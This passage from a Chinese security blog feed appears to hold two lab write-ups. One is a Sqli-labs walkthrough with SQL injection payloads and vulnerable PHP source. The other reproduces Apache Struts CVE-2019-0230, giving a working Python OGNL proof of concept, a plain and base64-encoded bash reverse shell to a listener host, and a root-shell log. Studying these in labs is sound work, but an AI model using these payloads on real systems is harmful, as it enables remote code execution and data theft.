src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110100217440.png" class><p><code>测试发现只存在两个字段</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110100626749.png" class><p><code>举个栗子</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110100826775.png" class><blockquote><p>其他方法如Less-1</p></blockquote><h2 id="0x12-Less-12-POST-基于报错-双引号-括号"><a href="#0x12-Less-12-POST-基于报错-双引号-括号" class="headerlink" title="0x12.Less-12 POST 基于报错 双引号+括号"></a>0x12.Less-12 POST 基于报错 双引号+括号</h2><p><code>同Less-11，只需要将单引号换为双引号加括号即可</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) -- -&amp;passwd=pass&amp;submit=Submit</span><br></pre></td></tr></table></figure><h2 id="0x13-Less-13-POST-双注入-单引号-括号"><a href="#0x13-Less-13-POST-双注入-单引号-括号" class="headerlink" title="0x13.Less-13 POST 双注入 单引号+括号"></a>0x13.Less-13 POST 双注入 单引号+括号</h2><p><code>同Less-5</code></p><blockquote><p>方法一、二、三均可用</p></blockquote><p><code>方法1</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110110042606.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110103120999.png" class><p><code>方法二</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110110308320.png" class><p><code>方法三</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110110528568.png" class><h2 id="0x14-Less-14-POST-双注入-双引号"><a href="#0x14-Less-14-POST-双注入-双引号" class="headerlink" title="0x14.Less-14 POST 双注入 双引号"></a>0x14.Less-14 POST 双注入 双引号</h2><blockquote><p>同Less-13，将单引号+括号换为双引号即可</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110111000136.png" class><h2 id="0x15-Less-15-POST-基于时间-bool盲注-单引号"><a href="#0x15-Less-15-POST-基于时间-bool盲注-单引号" class="headerlink" title="0x15.Less-15 POST 基于时间/bool盲注 单引号"></a>0x15.Less-15 POST 基于时间/bool盲注 单引号</h2><p><code>同Less-5的方法二与方法三</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110111527544.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110111652045.png" class><h2 id="0x16-Less-1-POST-基于时间-bool盲注-双引号-括号"><a href="#0x16-Less-1-POST-基于时间-bool盲注-双引号-括号" class="headerlink" title="0x16.Less-1 POST 基于时间/bool盲注 双引号+括号"></a>0x16.Less-1 POST 基于时间/bool盲注 双引号+括号</h2><blockquote><p>同Less-15，将单引号换为双引号+括号即可</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110112154590.png" class><h2 id="0x17-Less-17-POST-基于错误-更新查询"><a href="#0x17-Less-17-POST-基于错误-更新查询" class="headerlink" title="0x17.Less-17 POST 基于错误 更新查询"></a>0x17.Less-17 POST 基于错误 更新查询</h2><p><code>查看源码发现，当uname的值后面有特殊符号会加上一个/进行转义</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">// truncation (see comments)</span></span><br><span class="line">        $value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">        <span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">            &#123;</span><br><span class="line">            $value = stripslashes($value);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Quote if not a number</span></span><br><span class="line">        <span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">            &#123;</span><br><span class="line">            $value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        $value = intval($value);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line">$uname=check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"></span><br><span class="line">$passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>根据题目提示与源码推测passwd为注入点</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110114238770.png" class><p><code>payload同Less-5的方法一</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110120051232.png" class><p><code>这里直接使用以下payload会报错，users不能被修改</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110122233780.png" class><p><code>对payload进行嵌套，修改为如下</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select password from (select password from users limit 0,1) as demo),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110122126131.png" class><p><code>其他注入不在赘述</code></p><h2 id="0x18-Less-18-POST-基于报错-HTTP请求头-Uagent-field"><a href="#0x18-Less-18-POST-基于报错-HTTP请求头-Uagent-field" class="headerlink" title="0x18.Less-18 POST 基于报错 HTTP请求头 Uagent-field"></a>0x18.Less-18 POST 基于报错 HTTP请求头 Uagent-field</h2><p><code>查看源码</code></p><blockquote><p>可以发现，这里的$uname与$passwd都做了过滤，即当存在特殊字符时加上/进行转义</p><p>并且insert函数将Uagent插入到了数据库</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">// truncation (see comments)</span></span><br><span class="line">        $value = substr($value,<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">        <span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">            &#123;</span><br><span class="line">            $value = stripslashes($value);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Quote if not a number</span></span><br><span class="line">        <span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">            &#123;</span><br><span class="line">            $value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        $value = intval($value);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $uagent = $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">    $IP = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your IP ADDRESS is: &#x27;</span> .$IP;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">//echo &#x27;Your User Agent is: &#x27; .$uagent;</span></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">    $uname = check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">    $passwd = check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    echo &#x27;Your Your User name:&#x27;. $uname;</span></span><br><span class="line"><span class="comment">    echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">    echo &#x27;Your Password:&#x27;. $passwd;</span></span><br><span class="line"><span class="comment">    echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">    echo &#x27;Your User Agent String:&#x27;. $uagent;</span></span><br><span class="line"><span class="comment">    echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">    echo &#x27;Your User Agent String:&#x27;. $IP;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//logging the connection parameters to a file for analysis.    </span></span><br><span class="line">    $fp=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    fwrite($fp,<span class="string">&#x27;User Agent:&#x27;</span>.$uname.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    fclose($fp);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    $sql=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">    $result1 = mysql_query($sql);</span><br><span class="line">    $row1 = mysql_fetch_array($result1);</span><br><span class="line">        <span class="keyword">if</span>($row1)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">            $insert=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;</span>;</span><br><span class="line">            mysql_query($insert);</span><br><span class="line">            <span class="comment">//echo &#x27;Your IP ADDRESS is: &#x27; .$IP;</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">            <span class="comment">//echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Your User Agent is: &#x27;</span> .$uagent;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            print_r(mysql_error());            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">            print_r(mysql_error());</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;    </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>所以使用如下payload</code></p><blockquote><p>updatexml与extractvalue作用相同</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;</span><br><span class="line">and与or都可以，只是为了闭合单引号</span><br></pre></td></tr></table></figure><p><code>服务器执行的命令如下</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">sql=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=&#x27;admin&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;&#x27; and users.password=&#x27;&#x27; ORDER BY users.id DESC LIMIT 0,1&quot;</span></span></span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110124944874.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110133641590.png" class><h2 id="0x19-Less-19-POST-基于报错-HTTP请求头-Referer-field"><a href="#0x19-Less-19-POST-基于报错-HTTP请求头-Referer-field" class="headerlink" title="0x19.Less-19 POST 基于报错 HTTP请求头 Referer-field"></a>0x19.Less-19 POST 基于报错 HTTP请求头 Referer-field</h2><p><code>同Less18，只是注入点变为referer</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110125136890.png" class><h2 id="0x20-Less-20-POST-基于报错-cookie注入"><a href="#0x20-Less-20-POST-基于报错-cookie注入" class="headerlink" title="0x20.Less-20 POST 基于报错 cookie注入"></a>0x20.Less-20 POST 基于报错 cookie注入</h2><p><code>注入点为cookie，方法同Less-1</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; order by 3 -- -</span><br><span class="line">uname=admin&#x27; order by 4 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110130119066.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110130152559.png" class><p><strong><em>skip:deciduous_tree:</em></strong></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;Sqli_labs_Page1(basic)&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Sqli-labs" scheme="https://lunamoore.github.io/categories/Sqli-labs/"/>
    
    
    <category term="Sqli-labs" scheme="https://lunamoore.github.io/tags/Sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0230复现</title>
    <link href="https://lunamoore.github.io/2020/12/19/CVE-2019-0230/"/>
    <id>https://lunamoore.github.io/2020/12/19/CVE-2019-0230/</id>
    <published>2020-12-19T08:35:58.000Z</published>
    <updated>2021-06-06T12:53:36.758Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2019-0230-S2-059"><a href="#CVE-2019-0230-S2-059" class="headerlink" title="CVE-2019-0230(S2-059)"></a>CVE-2019-0230(S2-059)</h2><hr><h2 id="0x00-漏洞简述"><a href="#0x00-漏洞简述" class="headerlink" title="0x00.漏洞简述"></a>0x00.漏洞简述</h2><blockquote><p>Apache Struts 2.0.0 to 2.5.20 forced double OGNL evaluation, when evaluated on raw user input in tag attributes, may lead to remote code execution.</p><p>Apache Struts 2.0.0到2.5.20强制执行双重OGNL计算，当对原始用户输入的标记属性进行计算时，可能会导致远程代码执行。</p></blockquote><a id="more"></a><h2 id="0x01-影响"><a href="#0x01-影响" class="headerlink" title="0x01.影响"></a>0x01.影响</h2><ul><li><strong>version: 2.0.0-2.5.20</strong></li><li><strong>solution: apache-struts-upgrade-2_5_22</strong></li></ul><table><thead><tr><th align="center"><strong>Severity</strong></th><th align="center"><strong>CVSS</strong></th><th align="center"><strong>Published</strong></th><th align="center"><strong>Created</strong></th><th align="center"><strong>Added</strong></th><th align="center"><strong>Modified</strong></th></tr></thead><tbody><tr><td align="center">8</td><td align="center">(AV:N/AC:L/Au:N/C:P/I:P/A:P)</td><td align="center">08/17/2020</td><td align="center">08/15/2020</td><td align="center">08/17/2020</td><td align="center">09/21/2020</td></tr></tbody></table><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02.漏洞分析"></a>0x02.漏洞分析</h2><p><span class="exturl" data-url="aHR0cDovL2Jsb2cudG9wc2VjLmNvbS5jbi9zdHJ1dHMyLXMyLTA1OS0lRTYlQkMlOEYlRTYlQjQlOUUlRTUlODglODYlRTYlOUUlOTAv">天融信阿尔法实验室漏洞分析<i class="fa fa-external-link-alt"></i></span></p><p><strong>通过学习可知：此次漏洞需要开启（默认开启）<code>altSyntax</code>功能,只能是在标签<code>id</code>属性中存在表达式,并且参数还可以控制，攻击者通过构造特定的表达式赋值给id参数，传参后导致二次解析可造成远程命令执行漏洞。</strong></p><h2 id="0x03-搭建环境"><a href="#0x03-搭建环境" class="headerlink" title="0x03.搭建环境"></a>0x03.搭建环境</h2><p><span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3N0cnV0czIvczItMDU5Lw==">本次环境<i class="fa fa-external-link-alt"></i></span></p><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04.漏洞复现"></a>0x04.漏洞复现</h2><h3 id="1-访问环境"><a href="#1-访问环境" class="headerlink" title="1.访问环境"></a>1.访问环境</h3><img src="/2020/12/19/CVE-2019-0230/image-20201219162137008.png" class><h3 id="2-漏洞验证"><a href="#2-漏洞验证" class="headerlink" title="2.漏洞验证"></a>2.漏洞验证</h3><p><code>通过构造表达式%25&#123;2*10&#125;执行后发现标签属性id值变成了为10，说明成功执行了表达式并运算2*10，并返回了结果。</code></p><img src="/2020/12/19/CVE-2019-0230/image-20201219161950859.png" class><h3 id="3-构造payload"><a href="#3-构造payload" class="headerlink" title="3.构造payload"></a>3.构造payload</h3><p><code>本次使用bash -i &gt;&amp; /dev/tcp/192.168.1.129/6666 0&gt;&amp;1（需要编码）</code></p><p><span class="exturl" data-url="aHR0cDovL3d3dy5qYWNrc29uLXQuY2EvcnVudGltZS1leGVjLXBheWxvYWRzLmh0bWw=">编码转换地址<i class="fa fa-external-link-alt"></i></span></p><blockquote><p>转换</p><p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTI5LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}</p></blockquote><h3 id="4-编写POC"><a href="#4-编写POC" class="headerlink" title="4.编写POC"></a>4.编写POC</h3><p><code>将payload放到对应位置上</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.1.137:8080&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;payload&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res1 = requests.post(url, data=data1)</span><br><span class="line">res2 = requests.post(url, data=data2)</span><br></pre></td></tr></table></figure><h3 id="5-利用"><a href="#5-利用" class="headerlink" title="5.利用"></a>5.利用</h3><p><code>kali监听</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>执行POC get shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.129] from (UNKNOWN) [192.168.1.137] 33258</span><br><span class="line">bash: cannot set terminal process group (1): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">root@88497928f70b:/usr/src# whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@88497928f70b:/usr/src#</span><br></pre></td></tr></table></figure><h2 id="0x05-解决办法"><a href="#0x05-解决办法" class="headerlink" title="0x05.解决办法"></a>0x05.解决办法</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">最终的解决方法是为传入的每个值添加适当的验证，并将其用于标记的属性中。  除非为有效的用例真正需要，否则请勿使用强制使用值％以外的属性求值，而使用％&#123;...&#125;或$ &#123;...&#125;语法。 </span><br><span class="line"></span><br><span class="line">通过 升级到Struts 2.5.22，强制双重评估的可能恶意影响将进一步受到限制，并关闭了已报告的攻击媒介，特别是与主动OGNL表达注入保护结合使用时。</span><br><span class="line"></span><br><span class="line">升级到Struts 2.5.22时没有任何问题。（真的吗？？？🙃）</span><br></pre></td></tr></table></figure><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06.总结"></a>0x06.总结</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">强制使用Apache Struts框架时，会对分配给某些标签属性的属性值进行双重评估，例如，id这样就可以传递一个值，该值将在呈现标签属性时再次进行评估。通过精心设计的请求，这可以导致远程执行代码（RCE）。</span><br><span class="line"></span><br><span class="line">仅当在Struts标记属性内强制执行OGNL评估时，此问题才适用，当评估的表达式引用未经攻击的原始输入时，攻击者可以通过设计相应的请求来直接对其进行修改。</span><br><span class="line"></span><br><span class="line">例：</span><br><span class="line">&lt;s:url var=&quot;url&quot; namespace=&quot;/employee&quot; action=&quot;list&quot;/&gt;&lt;s:a id=&quot;%&#123;skillName&#125;&quot; href=&quot;%&#123;url&#125;&quot;&gt;List available Employees&lt;/s:a&gt;</span><br><span class="line">如果攻击者能够修改skillName请求中的属性，以使原始OGNL表达式skillName无需进一步验证即可传递给该属性，则skillName当作为请求的结果呈现标记时，将评估属性中包含的提供的OGNL表达式。</span><br><span class="line"></span><br><span class="line">从2.0.0开始，Struts会设计使用双重评估的机会，并且正确完成后将成为有用的工具，这最显着的意思是仅在给定表达式中引用经过验证的值。但是，在表达式中引用未经验证的用户输入时，可能会注入恶意代码。在持续的努力中，Struts框架包括缓解措施以限制注入的表达式的影响，但2.5.22之前的Struts仍未解决攻击向量</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;CVE-2019-0230-S2-059&quot;&gt;&lt;a href=&quot;#CVE-2019-0230-S2-059&quot; class=&quot;headerlink&quot; title=&quot;CVE-2019-0230(S2-059)&quot;&gt;&lt;/a&gt;CVE-2019-0230(S2-059)&lt;/h2&gt;&lt;hr&gt;
&lt;h2 id=&quot;0x00-漏洞简述&quot;&gt;&lt;a href=&quot;#0x00-漏洞简述&quot; class=&quot;headerlink&quot; title=&quot;0x00.漏洞简述&quot;&gt;&lt;/a&gt;0x00.漏洞简述&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Apache Struts 2.0.0 to 2.5.20 forced double OGNL evaluation, when evaluated on raw user input in tag attributes, may lead to remote code execution.&lt;/p&gt;
